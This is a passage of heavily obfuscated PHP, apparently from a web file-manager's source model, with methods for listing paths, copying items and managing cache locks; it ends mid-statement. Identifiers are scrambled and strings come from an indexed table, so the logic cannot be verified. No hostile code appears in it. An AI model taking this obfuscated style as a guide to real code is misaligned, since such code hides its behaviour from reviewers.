$dœ®Å÷ŸÙÕ[$BƒÚœçØ´[489]] = $BƒÚœçØ´[8] . LNG($BƒÚœçØ´[492]) . $BƒÚœçØ´[8] . ltrim($DÊ§ÎÄØ©¬, $BƒÚœçØ´[8]); $dœ®Å÷ŸÙÕ[$BƒÚœçØ´[481]] = $BƒÚœçØ´[493] . implode($BƒÚœçØ´[47], array_slice($bö‡‰½×¬Ş, 1)) . $BƒÚœçØ´[47]; goto aÛËÂÛ Ø; cƒŠñ†»‰Ğ: } protected function _listAppendPathRoot(&$EÆŠÒÔ»ĞÍ, $bìÇÃ•ŸÇá) { $f”ÂŠ÷Ş =& $_SERVER[Â€Á›¨õ]; $d‰¼¹ŞÑá’ = $f”ÂŠ÷Ş[33]; if ($EÆŠÒÔ»ĞÍ[$f”ÂŠ÷Ş[398]] == self::TYPE_USER) { if (defined($f”ÂŠ÷Ş[448]) && $EÆŠÒÔ»ĞÍ[$f”ÂŠ÷Ş[478]] == USER_ID) { $d‰¼¹ŞÑá’ = LNG($f”ÂŠ÷Ş[496]); if (!$bìÇÃ•ŸÇá) { $EÆŠÒÔ»ĞÍ[$f”ÂŠ÷Ş[28]] = $d‰¼¹ŞÑá’; } } else { $C»¾˜ºö»‡ = Model($f”ÂŠ÷Ş[497])->getInfoSimple($EÆŠÒÔ»ĞÍ[$f”ÂŠ÷Ş[478]]); $d‰¼¹ŞÑá’ = LNG($f”ÂŠ÷Ş[498]) . $f”ÂŠ÷Ş[159] . $C»¾˜ºö»‡[$f”ÂŠ÷Ş[28]] . $f”ÂŠ÷Ş[499]; } } else { if ($EÆŠÒÔ»ĞÍ[$f”ÂŠ÷Ş[398]] == self::TYPE_GROUP) { $C»¾˜ºö»‡ = Model($f”ÂŠ÷Ş[480])->getInfoSimple($EÆŠÒÔ»ĞÍ[$f”ÂŠ÷Ş[478]]); $d‰¼¹ŞÑá’ = $C»¾˜ºö»‡[$f”ÂŠ÷Ş[28]]; } else { if ($EÆŠÒÔ»ĞÍ[$f”ÂŠ÷Ş[398]] == self::TYPE_SYSTEM) { $d‰¼¹ŞÑá’ = $f”ÂŠ÷Ş[500]; } } } $d‰¼¹ŞÑá’ = $d‰¼¹ŞÑá’ ? $f”ÂŠ÷Ş[8] . $d‰¼¹ŞÑá’ . $f”ÂŠ÷Ş[8] : $f”ÂŠ÷Ş[8]; return $d‰¼¹ŞÑá’; } protected function _listAppendUser(&$c‡É©¤øÖ) { goto Aæ¤©´Ìë‚; dñ—ÒõÑÇ: unset($DŠîƒ˜˜æ); goto a¸çË…àÓ; DÆÇÜÁ¶ß×: $fœç§Éµ§¡ = array_merge($Dä¸åÃèËÖ, $a‹ˆÅÂÄø); $F¡¡‹êÌ˜Ä = Model($cŒ¡œÇ³İ[501])->userListInfo($fœç§Éµ§¡); foreach ($c‡É©¤øÖ as &$DŠîƒ˜˜æ) { $dË¦¢…–œ = $DŠîƒ˜˜æ[$cŒ¡œÇ³İ[426]]; $DŠîƒ˜˜æ[$cŒ¡œÇ³İ[426]] = $F¡¡‹êÌ˜Ä[$dË¦¢…–œ] ? $F¡¡‹êÌ˜Ä[$dË¦¢…–œ] : !1; $dË¦¢…–œ = $DŠîƒ˜˜æ[$cŒ¡œÇ³İ[428]]; $DŠîƒ˜˜æ[$cŒ¡œÇ³İ[428]] = $F¡¡‹êÌ˜Ä[$dË¦¢…–œ] ? $F¡¡‹êÌ˜Ä[$dË¦¢…–œ] : !1; if (isset($DŠîƒ˜˜æ[$cŒ¡œÇ³İ[439]]) && $DŠîƒ˜˜æ[$cŒ¡œÇ³İ[439]][$cŒ¡œÇ³İ[502]]) { $AŸÂ ôâ˜ = $GLOBALS[$cŒ¡œÇ³İ[6]][$cŒ¡œÇ³İ[87]][$cŒ¡œÇ³İ[503]]; if ($DŠîƒ˜˜æ[$cŒ¡œÇ³İ[439]][$cŒ¡œÇ³İ[504]] <= time() - $AŸÂ ôâ˜) { $this->metaSet($DŠîƒ˜˜æ[$cŒ¡œÇ³İ[390]], $cŒ¡œÇ³İ[502], null); $this->metaSet($DŠîƒ˜˜æ[$cŒ¡œÇ³İ[390]], $cŒ¡œÇ³İ[504], null); unset($DŠîƒ˜˜æ[$cŒ¡œÇ³İ[439]][$cŒ¡œÇ³İ[502]]); continue; } $eß‘îÏÌ× = $DŠîƒ˜˜æ[$cŒ¡œÇ³İ[439]][$cŒ¡œÇ³İ[502]]; $DŠîƒ˜˜æ[$cŒ¡œÇ³İ[439]][$cŒ¡œÇ³İ[505]] = Model($cŒ¡œÇ³İ[501])->getInfoSimpleOuter($eß‘îÏÌ×); } } goto dñ—ÒõÑÇ; Aæ¤©´Ìë‚: $cŒ¡œÇ³İ =& $_SERVER[Â€Á›¨õ]; $Dä¸åÃèËÖ = array_to_keyvalue($c‡É©¤øÖ, $cŒ¡œÇ³İ[33], $cŒ¡œÇ³İ[426]); $a‹ˆÅÂÄø = array_to_keyvalue($c‡É©¤øÖ, $cŒ¡œÇ³İ[33], $cŒ¡œÇ³İ[428]); goto DÆÇÜÁ¶ß×; a¸çË…àÓ: } public function parentLevelArray($bÖ«êÄˆõ”) { $EÈªÑù =& $_SERVER[Â€Á›¨õ]; $bÖ«êÄˆõ” = explode($EÈªÑù[47], trim($bÖ«êÄˆõ”, $EÈªÑù[47])); return array_remove_value($bÖ«êÄˆõ”, $EÈªÑù[491]); } public function listAll($fÍ—Ï¾Ğ¤) { goto cöø¿‚Ûâ§; cî¦ğ¥‰’ª: $this->_listAppendAuth($Aê‹­“ÅØ‰); $this->_listAppendUser($Aê‹­“ÅØ‰); $this->_listAppendPath($Aê‹­“ÅØ‰); goto b—Ëíõ§ãõ; cª×®ÂâÌ: $e¸Æéæ£—¾ = array(); foreach ($Aê‹­“ÅØ‰ as $fËÀ‘ßšƒç => $Aöî§§Ä‘) { goto Dïšñ©î†™; aÏ×¦£‡ø§: $e˜¦¥•¬Ã = str_replace($Aº£õ«í[490], $Aº£õ«í[8], $e˜¦¥•¬Ã); $e˜¦¥•¬Ã = str_replace($Aº£õ«í[490], $Aº£õ«í[8], $e˜¦¥•¬Ã); $fªà­ª§œ = array($Aº£õ«í[408] => str_replace($Aº£õ«í[490], $Aº£õ«í[8], $e˜¦¥•¬Ã), $Aº£õ«í[512] => intval($Aöî§§Ä‘[$Aº£õ«í[397]]), $Aº£õ«í[84] => $this->pathInfoFilter($Aöî§§Ä‘)); goto aÍ‹éÆôâ£; Dïšñ©î†™: $fÖ½ÄÛåªŠ = $this->parentLevelArray($Aöî§§Ä‘[$Aº£õ«í[481]]); array_shift($fÖ½ÄÛåªŠ); $e˜¦¥•¬Ã = $FÑ¦¡ÒØù‡; goto F‹ÁŒ¯›À; F‹ÁŒ¯›À: for ($CŞ³¦íŒ… = 0; $CŞ³¦íŒ… < count($fÖ½ÄÛåªŠ); $CŞ³¦íŒ…++) { $e˜¦¥•¬Ã .= $Aê‹­“ÅØ‰[$fÖ½ÄÛåªŠ[$CŞ³¦íŒ…]][$Aº£õ«í[28]] . $Aº£õ«í[8]; } $e˜¦¥•¬Ã .= $Aöî§§Ä‘[$Aº£õ«í[28]]; if ($Aöî§§Ä‘[$Aº£õ«í[397]]) { $e˜¦¥•¬Ã .= $Aº£õ«í[8]; } goto aÏ×¦£‡ø§; aÍ‹éÆôâ£: if (!$Aöî§§Ä‘[$Aº£õ«í[397]]) { $fªà­ª§œ[$Aº£õ«í[441]] = $Aöî§§Ä‘[$Aº£õ«í[441]]; $fªà­ª§œ[$Aº£õ«í[85]] = $Aöî§§Ä‘[$Aº£õ«í[75]]; } $e¸Æéæ£—¾[] = $fªà­ª§œ; goto Aóêö®…¿Õ; Aóêö®…¿Õ: } return $e¸Æéæ£—¾; goto ağ¼¼ÓéêÄ; b—Ëíõ§ãõ: $Aê‹­“ÅØ‰ = array_to_keyvalue($Aê‹­“ÅØ‰, $Aº£õ«í[390]); $FÑ¦¡ÒØù‡ = "\57{$DªŒÈÊñ…®[$Aº£õ«í[28]]}\57"; $FÑ¦¡ÒØù‡ = $FÑ¦¡ÒØù‡ == $Aº£õ«í[490] ? $Aº£õ«í[8] : $FÑ¦¡ÒØù‡; goto cª×®ÂâÌ; cöø¿‚Ûâ§: $Aº£õ«í =& $_SERVER[Â€Á›¨õ]; $DªŒÈÊñ…® = $this->sourceInfo($fÍ—Ï¾Ğ¤); $cÚÉ«‚°â¤ = array($Aº£õ«í[506] => array($Aº£õ«í[507], $DªŒÈÊñ…®[$Aº£õ«í[481]] . $fÍ—Ï¾Ğ¤ . $Aº£õ«í[508]), $Aº£õ«í[509] => 0); goto a¥İÍ¡¶ˆ—; a¥İÍ¡¶ˆ—: $A…ÚÂŒ·… = $Aº£õ«í[510]; $FªòÎŸÃÌ = "\114\x45\x46\124\x20\112\117\111\x4e\x20{$this->tablePrefix}\x69\157\x5f\x66\x69\154\x65\40\x66\151\x6c\x65\x20\157\x6e\40\x73\157\x75\x72\143\145\56\x66\x69\x6c\x65\111\104\x20\75\x20\x66\151\154\x65\x2e\x66\151\154\x65\x49\x44"; $Aê‹­“ÅØ‰ = $this->alias($Aº£õ«í[511])->field($A…ÚÂŒ·…)->where($cÚÉ«‚°â¤)->join($FªòÎŸÃÌ)->select(); goto cî¦ğ¥‰’ª; ağ¼¼ÓéêÄ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($f…ÁÃõ‡‚Ü) { goto EíŠ¼¥Ï½; Bì£Ğ¶ö…í: $a„¼×…õ÷‚ = 1; $this->_lockEvent($f…ÁÃõ‡‚Ü, array($aÖ¯²—ºÇâ[514], $aÖ¯²—ºÇâ[515]), $a„¼×…õ÷‚); $this->_lockParent($f…ÁÃõ‡‚Ü, array($aÖ¯²—ºÇâ[515]), $a„¼×…õ÷‚); goto AŠîìÀ·ƒ; AŠîìÀ·ƒ: $this->_lockEvent($f…ÁÃõ‡‚Ü, array($aÖ¯²—ºÇâ[516], $aÖ¯²—ºÇâ[517]), $a„¼×…õ÷‚); $this->_lockCheckEnd($aÖ¯²—ºÇâ[513], $f…ÁÃõ‡‚Ü); goto bÒâù‹Ğ­; EíŠ¼¥Ï½: $aÖ¯²—ºÇâ =& $_SERVER[Â€Á›¨õ]; if (!$this->allowLock()) { return; } $this->_lockCheck($aÖ¯²—ºÇâ[513], $f…ÁÃõ‡‚Ü); goto Bì£Ğ¶ö…í; bÒâù‹Ğ­: } public function lockCopyEnd($aÁ©œÑ’¡) { $fÙÛë±Š‹¦ =& $_SERVER[Â€Á›¨õ]; if (!$this->allowLock()) { return; } $EªÉ³³±‡ = 0; $this->_lockEvent($aÁ©œÑ’¡, array($fÙÛë±Š‹¦[514], $fÙÛë±Š‹¦[515]), $EªÉ³³±‡); $this->_lockParent($aÁ©œÑ’¡, array($fÙÛë±Š‹¦[515]), $EªÉ³³±‡); $this->_lockEvent($aÁ©œÑ’¡, array($fÙÛë±Š‹¦[516], $fÙÛë±Š‹¦[517]), $EªÉ³³±‡); } public function lockWriteStart($AÍøÓ¤å, $B¢ÖøÁ·ëÅ = '') { goto AÄ´Ñ†Óº±; AÄ´Ñ†Óº±: $f’…†İöŠ =& $_SERVER[Â€Á›¨õ]; if (!$this->allowLock()) { return; } $this->_lockCheck($f’…†İöŠ[514], $AÍøÓ¤å); goto Aç÷•Œµ‰‡; Aç÷•Œµ‰‡: $cÈ†õ˜ß§š = 1; $this->_lockKey($f’…†İöŠ[518] . $AÍøÓ¤å . $f’…†İöŠ[94] . $B¢ÖøÁ·ëÅ, $cÈ†õ˜ß§š); $this->_lockEvent($AÍøÓ¤å, array($f’…†İöŠ[513], $f’…†İöŠ[515]), $cÈ†õ˜ß§š); goto Eğ­ïÇ “Ø; Eğ­ïÇ “Ø: $this->_lockParent($AÍøÓ¤å, array($f’…†İöŠ[513], $f’…†İöŠ[515]), $cÈ†õ˜ß§š); $this->_lockCheckEnd($f’…†İöŠ[514], $AÍøÓ¤å); goto bĞëæ…¢¦ì; bĞëæ…¢¦ì: } public function lockWriteEnd($C†ç¸§†Ö’, $FÆ‘…†…õĞ = '') { $F¼Á½‰…› =& $_SERVER[Â€Á›¨õ]; if (!$this->allowLock()) { return; } $E©îÚŠÅÔ = 0; $this->_lockKey($F¼Á½‰…›[518] . $C†ç¸§†Ö’ . $F¼Á½‰…›[94] . $FÆ‘…†…õĞ, $E©îÚŠÅÔ); $this->_lockEvent($C†ç¸§†Ö’, array($F¼Á½‰…›[513], $F¼Á½‰…›[515]), $E©îÚŠÅÔ); $this->_lockParent($C†ç¸§†Ö’, array($F¼Á½‰…›[513], $F¼Á½‰…›[515]), $E©îÚŠÅÔ); } public function lockMoveStart($d÷§¹Ğ»Á¼) { goto fŒ¤ÌÏ¿ˆ; fŒ¤ÌÏ¿ˆ: $EÓ¬¦‡Å¸Ô =& $_SERVER[Â€Á›¨õ]; if (!$this->allowLock()) { return; } $this->_lockCheck($EÓ¬¦‡Å¸Ô[515], $d÷§¹Ğ»Á¼); goto bÌŸç›Ì; bÌŸç›Ì: $a§ö¥Ó·ñ© = 1; $this->_lockKey($EÓ¬¦‡Å¸Ô[519] . $d÷§¹Ğ»Á¼, $a§ö¥Ó·ñ©); $this->_lockEvent($d÷§¹Ğ»Á¼, array($EÓ¬¦‡Å¸Ô[513], $EÓ¬¦‡Å¸Ô[514]), $a§ö¥Ó·ñ©); goto c¼ ÷›ÙöŒ; c¼ ÷›ÙöŒ: $this->_lockParent($d÷§¹Ğ»Á¼, array($EÓ¬¦‡Å¸Ô[513], $EÓ¬¦‡Å¸Ô[515]), $a§ö¥Ó·ñ©); $this->_lockEvent($d÷§¹Ğ»Á¼, array($EÓ¬¦‡Å¸Ô[520], $EÓ¬¦‡Å¸Ô[516], $EÓ¬¦‡Å¸Ô[517]), $a§ö¥Ó·ñ©); $this->_lockCheckEnd($EÓ¬¦‡Å¸Ô[515], $d÷§¹Ğ»Á¼); goto cÛ„×çöàÈ; cÛ„×çöàÈ: } public function lockMoveEnd($eŠ×Ç¿…¡î) { goto cçò°š§; fà¬¯ªŒÔ: $this->_lockEvent($eŠ×Ç¿…¡î, array($BïèªÏ¸ã[520], $BïèªÏ¸ã[516], $BïèªÏ¸ã[517]), $a¶ƒµäï¥Õ); goto F½®ÂŠòåè; E×øÓÖ•Ï’: $this->_lockKey($BïèªÏ¸ã[519] . $eŠ×Ç¿…¡î, $a¶ƒµäï¥Õ); $this->_lockEvent($eŠ×Ç¿…¡î, array($BïèªÏ¸ã[513], $BïèªÏ¸ã[514]), $a¶ƒµäï¥Õ); $this->_lockParent($eŠ×Ç¿…¡î, array($BïèªÏ¸ã[513], $BïèªÏ¸ã[515]), $a¶ƒµäï¥Õ); goto fà¬¯ªŒÔ; cçò°š§: $BïèªÏ¸ã =& $_SERVER[Â€Á›¨õ]; if (!$this->allowLock()) { return; } $a¶ƒµäï¥Õ = 0; goto E×øÓÖ•Ï’; F½®ÂŠòåè: } private function _lockCheck($EÔ¯Ã÷ŒÍÎ, $D»Ò‰øÎ¥’) { goto f§åÆÃøÀ; F´ƒÉ…¯”: $this->_lockTimeStart[$aÅÉèËº¨ù] = timeFloat(); if (!is_array($b¤‚èõøÇ´)) { return; } $a…Ğ‹¿¸¹ = LNG($eÍÚ¼ƒ’ô[521]); goto B‘À¾¡¯ğ†; E‚—Ï¢†¿Ä: $cñî®Ô•ÏŒ = array_reverse($this->parentLevelArray($b¤‚èõøÇ´[$eÍÚ¼ƒ’ô[481]])); foreach ($cñî®Ô•ÏŒ as $eÑÎôğ•ÈÖ) { $aÅÉèËº¨ù = $EÔ¯Ã÷ŒÍÎ . $eÍÚ¼ƒ’ô[522] . $eÑÎôğ•ÈÖ; if (CacheLock::lockGet($eÍÚ¼ƒ’ô[523] . $aÅÉèËº¨ù)) { $b¤‚èõøÇ´ = $this->sourceInfo($eÑÎôğ•ÈÖ); CacheLock::setErrorMsg($eÍÚ¼ƒ’ô[159] . htmlspecialchars($b¤‚èõøÇ´[$eÍÚ¼ƒ’ô[28]]) . $eÍÚ¼ƒ’ô[499] . $a…Ğ‹¿¸¹); $this->_lockKey($aÅÉèËº¨ù, 1); $this->_lockKey($aÅÉèËº¨ù, 0); } } goto d®¦òø‘Ñ´; f§åÆÃøÀ: $eÍÚ¼ƒ’ô =& $_SERVER[Â€Á›¨õ]; $b¤‚èõøÇ´ = $this->sourceInfo($D»Ò‰øÎ¥’); $aÅÉèËº¨ù = $EÔ¯Ã÷ŒÍÎ . $eÍÚ¼ƒ’ô[94] . $D»Ò‰øÎ¥’; goto F´ƒÉ…¯”; B‘À¾¡¯ğ†: CacheLock::setErrorMsg($eÍÚ¼ƒ’ô[159] . htmlspecialchars($b¤‚èõøÇ´[$eÍÚ¼ƒ’ô[28]]) . $eÍÚ¼ƒ’ô[499] . $a…Ğ‹¿¸¹); $this->_lockKey($aÅÉèËº¨ù, 1); $this->_lockKey($aÅÉèËº¨ù, 0); goto E‚—Ï¢†¿Ä; d®¦òø‘Ñ´: } private function _lockCheckEnd($c¬É•á‚¯², $Eİ·â‡ÆŒ) { goto B½Å…—õ¶; B½Å…—õ¶: $f³‹´‡Ã =& $_SERVER[Â€Á›¨õ]; $fĞ«¹¨—Ó = $c¬É•á‚¯² . $f³‹´‡Ã[94] . $Eİ·â‡ÆŒ; CacheLock::setErrorMsg($f³‹´‡Ã[373]); goto EñÕÖËÅ² ; EñÕÖËÅ² : if (!isset($this->_lockTimeStart[$fĞ«¹¨—Ó])) { return; } $C¸ØØ‚¦ÊÕ = timeFloat() - $this->_lockTimeStart[$fĞ«¹¨—Ó]; unset($this->_lockTimeStart[$fĞ«¹¨—Ó]); goto BŠš®Ñ‰­†; BŠš®Ñ‰­†: if ($C¸ØØ‚¦ÊÕ > 0.5) { unset(self::$cacheSourceInfo[$f³‹´‡Ã[432] . $Eİ·â‡ÆŒ]); } $F§ã¹™ÄÓ = $this->sourceInfo($Eİ·â‡ÆŒ); if (!$F§ã¹™ÄÓ) { show_json(LNG($f³‹´‡Ã[104]), !1); } goto dáŸÎ¡™õÃ; dáŸÎ¡™õÃ: } private function _lockParent($dÖÛè°µ¨Ş, $a‘³ÖÇã, $BÊ’ğ±øÉ) { if (!$this->autoLockSet) { return; } $CíÙ–µÜ¬î = $this->sourceInfo($dÖÛè°µ¨Ş); if (!is_array($CíÙ–µÜ¬î)) { return; } $aÓ–”ÚİÕô = array_reverse($this->parentLevelArray($CíÙ–µÜ¬î[$_SERVER[Â€Á›¨õ][481]])); foreach ($aÓ–”ÚİÕô as $A›ë„Ä²­ğ) { $this->_lockEvent($A›ë„Ä²­ğ, $a‘³ÖÇã, $BÊ’ğ±øÉ); } } private function _lockEvent($AÖÖƒ§Ñ¨Ó, $bÚèÒ«¾ ³, $FÃÅÜ‡°†ª) { $AÕöïƒ£¥Ÿ =& $_SERVER[Â€Á›¨õ]; if (!$this->autoLockSet) { return; } foreach ($bÚèÒ«¾ ³ as $D´íÈ¯¦ò©) { $eÛõîÜ§Ò = $D´íÈ¯¦ò© . $AÕöïƒ£¥Ÿ[94] . $AÖÖƒ§Ñ¨Ó; if ($FÃÅÜ‡°†ª && CacheLock::lockGet($AÕöïƒ£¥Ÿ[523] . $eÛõîÜ§Ò)) { continue; } $this->_lockKey($eÛõîÜ§Ò, $FÃÅÜ‡°†ª); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($F†®Ìé„±©, $fä·½ ¹¼ê = 1) { $CİŞÅîÃÎÄ = $_SERVER[Â€Á›¨õ][523] . md5($F†®Ìé„±©); if ($fä·½ ¹¼ê) { if (isset(self::$_lockItemArr[$CİŞÅîÃÎÄ])) { return; } self::$_lockItemArr[$CİŞÅîÃÎÄ] = 1; CacheLock::lock($CİŞÅîÃÎÄ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$CİŞÅîÃÎÄ])) { return; } unset(self::$_lockItemArr[$CİŞÅîÃÎÄ]); CacheLock::unlock($CİŞÅîÃÎÄ); } } public function isParentOf($Eñ«ÌÖÏÀô, $E¯­Û¬ËÅ±) { goto AÁ™‹åÏÙÀ; AÁ™‹åÏÙÀ: $eßç‰ŠÏ… =& $_SERVER[Â€Á›¨õ]; $a£Œ‘ŸÛäİ = $this->sourceInfo($Eñ«ÌÖÏÀô); $c¡‹Ú¯ç „ = $this->sourceInfo($E¯­Û¬ËÅ±); goto fœ¢Æ®…à; fœ¢Æ®…à: $AÇáâ ›Ñí = $a£Œ‘ŸÛäİ[$eßç‰ŠÏ…[481]] . $a£Œ‘ŸÛäİ[$eßç‰ŠÏ…[390]] . $eßç‰ŠÏ…[47]; $B¿Ä¡µâî = $c¡‹Ú¯ç „[$eßç‰ŠÏ…[481]] . $c¡‹Ú¯ç „[$eßç‰ŠÏ…[390]] . $eßç‰ŠÏ…[47]; $bÂ¡íÎ‘…Ì = strpos($B¿Ä¡µâî, $AÇáâ ›Ñí) === 0; goto E×éëå¨óí; E×éëå¨óí: return $bÂ¡íÎ‘…Ì; goto AçŒÑø’Æ; AçŒÑø’Æ: } private $targetIsDelete = 0; public function copy($BÊ’‹‡Âù¾, $b„‚ÒĞßí±, $båà³Ò–Øò = REPEAT_REPLACE, $dŸŸÒØ“·Š = '') { goto a»ÑÀà…²›; D¢ÊÇÒç³Ù: $this->saveAll($EÛçåÎùâ—[$eĞ½î–ø÷¢[526]]); Model($eĞ½î–ø÷¢[173])->linkAdd($EÛçåÎùâ—[$eĞ½î–ø÷¢[524]]); $this->folderSizeReset($b„‚ÒĞßí±); goto f²äÔ›ğ¡ä; Eƒƒ’ˆŒÈÎ: $this->_childrenListClear(); $this->lockCopyEnd($BÊ’‹‡Âù¾); $this->lockWriteEnd($b„‚ÒĞßí±, $b…¾Ñ¦»£); goto B¾‚ŸÕ‚—Ó; f²äÔ›ğ¡ä: $this->updateModifyTime($b„‚ÒĞßí±); return $a¥æƒ¾³°õ; goto cñÑÆ—Ã×; B¾‚ŸÕ‚—Ó: if ($b‰ìÊŸ£ˆ°[$eĞ½î–ø÷¢[397]] == $eĞ½î–ø÷¢[86] && $dÒÌÅƒ’¦… == $a¥æƒ¾³°õ) { $this->folderSizeResetChildren($dÒÌÅƒ’¦…); } Model($eĞ½î–ø÷¢[527])->addAll($EÛçåÎùâ—[$eĞ½î–ø÷¢[525]], array(), !0); if ($dÒÌÅƒ’¦… != $a¥æƒ¾³°õ || $b‰ìÊŸ£ˆ°[$eĞ½î–ø÷¢[397]] == $eĞ½î–ø÷¢[86]) { Model($eĞ½î–ø÷¢[528])->eventCopy($a¥æƒ¾³°õ); } goto D¢ÊÇÒç³Ù; E˜¢¡Éñ¸æ: $this->targetIsDelete = intval($b‰ìÊŸ£ˆ°[$eĞ½î–ø÷¢[417]]); $dÒÌÅƒ’¦… = $this->fileNameExistCache($b„‚ÒĞßí±, $b‰ìÊŸ£ˆ°[$eĞ½î–ø÷¢[28]]); $a¥æƒ¾³°õ = $this->_copy($BÊ’‹‡Âù¾, $b„‚ÒĞßí±, $båà³Ò–Øò, $EÛçåÎùâ—, !0, $dŸŸÒØ“·Š); goto Eƒƒ’ˆŒÈÎ; e®ñ·¥ùÎ: $this->lockCopyStart($BÊ’‹‡Âù¾); $this->lockWriteStart($b„‚ÒĞßí±, $b…¾Ñ¦»£); $EÛçåÎùâ— = array($eĞ½î–ø÷¢[524] => array(), $eĞ½î–ø÷¢[525] => array(), $eĞ½î–ø÷¢[526] => array()); goto E˜¢¡Éñ¸æ; FÉÕ·ÀÑœÙ: if (!$b‰ìÊŸ£ˆ° || !$AóÒÁÒï£ || $AóÒÁÒï£[$eĞ½î–ø÷¢[397]] != $eĞ½î–ø÷¢[86]) { return !1; } if ($this->isParentOf($BÊ’‹‡Âù¾, $b„‚ÒĞßí±)) { return !1; } $b…¾Ñ¦»£ = $dŸŸÒØ“·Š ? $dŸŸÒØ“·Š : $b‰ìÊŸ£ˆ°[$eĞ½î–ø÷¢[28]]; goto e®ñ·¥ùÎ; a»ÑÀà…²›: $eĞ½î–ø÷¢ =& $_SERVER[Â€Á›¨õ]; $b‰ìÊŸ£ˆ° = $this->sourceInfo($BÊ’‹‡Âù¾); $AóÒÁÒï£ = $this->sourceInfo($b„‚ÒĞßí±); goto FÉÕ·ÀÑœÙ; cñÑÆ—Ã×: } private function _copy($cİÄ õ«ùæ, $dçÓ‰Ë¼„, $B³Áã™µ°Ì, &$FÅÆöÂ„¸º, $EÌğ á—ƒ…, $aÎÉéõì¶ = '') { goto a’åÔ¾¼ÃÄ; EÈ›¨„÷²‚: return $bŞ®„¥²‰‰; goto c¾éĞªõ‰Ÿ; c´ÆÒ¡å: $d°ô¿ä“‚Ş = $aÎÉéõì¶ ? $aÎÉéõì¶ : $fà×ÙíÒ¾«[$D‹¥•¶òíĞ[28]]; $Dò›ÔÏÌ—´ = $this->fileNameExistCache($dçÓ‰Ë¼„, $d°ô¿ä“‚Ş); if ($EÌğ á—ƒ…) { $this->_childrenAllMake($cİÄ õ«ùæ); if ($Eƒò³œÄâ && $Dò›ÔÏÌ—´) { $this->_childrenAllMake($Dò›ÔÏÌ—´); } } goto b¨ÆØšù‚Ü; a’åÔ¾¼ÃÄ: $D‹¥•¶òíĞ =& $_SERVER[Â€Á›¨õ]; $fà×ÙíÒ¾« = $this->sourceInfoCache($cİÄ õ«ùæ); $Eƒò³œÄâ = $fà×ÙíÒ¾«[$D‹¥•¶òíĞ[397]] == $D‹¥•¶òíĞ[86]; goto c´ÆÒ¡å; b¨ÆØšù‚Ü: if (!$Dò›ÔÏÌ—´) { return $this->_copyCreate($cİÄ õ«ùæ, $dçÓ‰Ë¼„, $d°ô¿ä“‚Ş, $FÅÆöÂ„¸º); } $bŞ®„¥²‰‰ = $Dò›ÔÏÌ—´; if ($Eƒò³œÄâ) { if ($B³Áã™µ°Ì == REPEAT_RENAME_FOLDER) { $d°ô¿ä“‚Ş = $this->fileNameAutoCache($dçÓ‰Ë¼„, $d°ô¿ä“‚Ş, $B³Áã™µ°Ì, $Eƒò³œÄâ); $bŞ®„¥²‰‰ = $this->_copyCreate($cİÄ õ«ùæ, $dçÓ‰Ë¼„, $d°ô¿ä“‚Ş, $FÅÆöÂ„¸º); } else { $C„ÒË”‚Ñ‡ = $this->_childrenList($cİÄ õ«ùæ); foreach ($C„ÒË”‚Ñ‡ as $c˜Ñ†å—®ä) { $this->_copy($c˜Ñ†å—®ä[$D‹¥•¶òíĞ[390]], $Dò›ÔÏÌ—´, $B³Áã™µ°Ì, $FÅÆöÂ„¸º, !1); } } } else { if ($B³Áã™µ°Ì == REPEAT_RENAME || $B³Áã™µ°Ì == REPEAT_RENAME_FOLDER) { $d°ô¿ä“‚Ş = $this->fileNameAutoCache($dçÓ‰Ë¼„, $d°ô¿ä“‚Ş, $B³Áã™µ°Ì, $Eƒò³œÄâ); $bŞ®„¥²‰‰ = $this->_copyCreate($cİÄ õ«ùæ, $dçÓ‰Ë¼„, $d°ô¿ä“‚Ş, $FÅÆöÂ„¸º); } else { if ($B³Áã™µ°Ì == REPEAT_REPLACE) { $bïÒ›Ü¶Ú« = $this->sourceInfoCache($Dò›ÔÏÌ—´); $cˆÊÈ‹éá = $this->fileHistory($bïÒ›Ü¶Ú«, $fà×ÙíÒ¾«[$D‹¥•¶òíĞ[441]], $fà×ÙíÒ¾«[$D‹¥•¶òíĞ[77]]); if ($cˆÊÈ‹éá) { $FÅÆöÂ„¸º[$D‹¥•¶òíĞ[524]][] = $fà×ÙíÒ¾«[$D‹¥•¶òíĞ[441]]; } } else { if ($B³Áã™µ°Ì == REPEAT_SKIP) { } } } Hook::trigger($D‹¥•¶òíĞ[529], array($D‹¥•¶òíĞ[530], $fà×ÙíÒ¾«, 0)); } goto EÈ›¨„÷²‚; c¾éĞªõ‰Ÿ: } private function _copyCreate($fŞ½„õ„£’, $A»¢ø¾õ¿, $EƒÇ¿Ë˜ñÃ, &$fğ†õƒÒ…’) { goto b¯°×’²ÄÈ; a¯êöİµö£: $this->_childrenListAll($fŞ½„õ„£’, $B¨ª¬ß‡); $B¹÷ºÒÁÕ· = count($B¨ª¬ß‡); if ($B¹÷ºÒÁÕ· == 0) { return $AÒ¢ÛºŒà¬; } goto aèÖ‡Ç†¡‹; fŠÁâÉ½Ş: $AÒ¢ÛºŒà¬ = $this->add($d¯¼†”Êø); $AŒçíœŠŸ° = array($fòä¹ÇØÈƒ[390] => $AÒ¢ÛºŒà¬, $fòä¹ÇØÈƒ[28] => $EƒÇ¿Ë˜ñÃ); $this->_copyApplyMeta($AŒçíœŠŸ°, $fğ†õƒÒ…’); goto BêÅ˜‹¥›; aèÖ‡Ç†¡‹: $BôáÇí¿Õø = $this->sourceInfo($AÒ¢ÛºŒà¬); foreach ($B¨ª¬ß‡ as $c’¼Ñ‚Î‡) { $b¹ö„Â§çÀ = $this->_makeItemData($c’¼Ñ‚Î‡, $BôáÇí¿Õø, $c’¼Ñ‚Î‡[$fòä¹ÇØÈƒ[28]]); $b¹ö„Â§çÀ[$fòä¹ÇØÈƒ[481]] = $c’¼Ñ‚Î‡[$fòä¹ÇØÈƒ[481]]; $BÌ¼ÂÕŠÅğ[] = $b¹ö„Â§çÀ; } $this->chunkEventSet($fòä¹ÇØÈƒ[534], array($fòä¹ÇØÈƒ[535], $d¯¼†”Êø, $B¹÷ºÒÁÕ·)); goto a©³Õİ‹é½; b¯°×’²ÄÈ: $fòä¹ÇØÈƒ =& $_SERVER[Â€Á›¨õ]; $aéÉé©Úù˜ = $this->sourceInfoCache($fŞ½„õ„£’); $D²…õí¼– = $this->sourceInfoCache($A»¢ø¾õ¿); goto e¹¤‹ğéãº; FƒØƒ§ò: foreach 